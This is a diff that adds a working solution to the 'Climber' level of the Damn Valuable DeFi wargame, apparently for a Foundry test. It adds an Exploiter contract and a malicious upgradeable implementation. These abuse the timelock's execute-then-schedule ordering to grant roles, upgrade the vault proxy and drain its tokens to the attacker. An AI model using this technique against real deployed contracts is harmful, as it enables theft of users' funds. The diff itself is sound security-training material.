@@ -8,6 +8,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -69,13 +70,11 @@ contract Climber is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        Exploiter exploiter = new Exploiter(dvt, climberTimelock, climberImplementation, climberVaultProxy);
+        vm.label(address(exploiter), "Exploiter contract");
+        exploiter.exploit();
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -87,4 +86,83 @@ contract Climber is Test {
         assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
         assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
     }
+}
+
+contract Exploiter {
+    address[] targets = new address[](5);
+    uint256[] values = new uint256[](5);
+    bytes[] dataElements = new bytes[](5);
+
+    DamnValuableToken internal immutable dvt;
+    ClimberTimelock internal immutable climberTimelock;
+    ClimberVault internal immutable climberImplementation;
+    ERC1967Proxy internal immutable climberVaultProxy;
+    address internal immutable owner;
+    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "only owner"); // Modifier to avoid getting front-run by searchers
+        _;
+    }
+
+    constructor(
+        DamnValuableToken _dvt,
+        ClimberTimelock _climberTimelock,
+        ClimberVault _climberImplementation,
+        ERC1967Proxy _climberVaultProxy
+    ) {
+        dvt = _dvt;
+        climberTimelock = _climberTimelock;
+        climberImplementation = _climberImplementation;
+        climberVaultProxy = _climberVaultProxy;
+        owner = msg.sender;
+    }
+
+    function exploit() external onlyOwner {
+        NewImplementation newImplementation = new NewImplementation(dvt, owner, climberTimelock);
+
+        targets[0] = address(climberTimelock);
+        targets[1] = address(climberTimelock);
+        targets[2] = address(climberVaultProxy);
+        targets[3] = address(climberVaultProxy);
+        targets[4] = address(this);
+
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+        values[4] = 0;
+
+        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
+        dataElements[2] = abi.encodeWithSignature("upgradeTo(address)", address(newImplementation));
+        dataElements[3] = abi.encodeWithSignature("transferTokens()");
+        dataElements[4] = abi.encodeWithSignature("schedule()");
+
+        climberTimelock.execute(targets, values, dataElements, keccak256("salt"));
+    }
+
+    function schedule() external {
+        climberTimelock.schedule(targets, values, dataElements, keccak256("salt"));
+    }
+}
+
+contract NewImplementation is UUPSUpgradeable {
+    DamnValuableToken internal immutable dvt;
+    address internal immutable attacker;
+    ClimberTimelock internal immutable climberTimelock;
+
+    constructor(DamnValuableToken _dvt, address _attacker, ClimberTimelock _climberTimelock) {
+        dvt = _dvt;
+        attacker = _attacker;
+        climberTimelock = _climberTimelock;
+    }
+
+    function transferTokens() external {
+        dvt.transfer(attacker, dvt.balanceOf(address(this)));
+        console.log("attacker balance: %s", dvt.balanceOf(attacker));
+        console.log("Vault balance: %s", dvt.balanceOf(address(this)));
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal override {}
 }
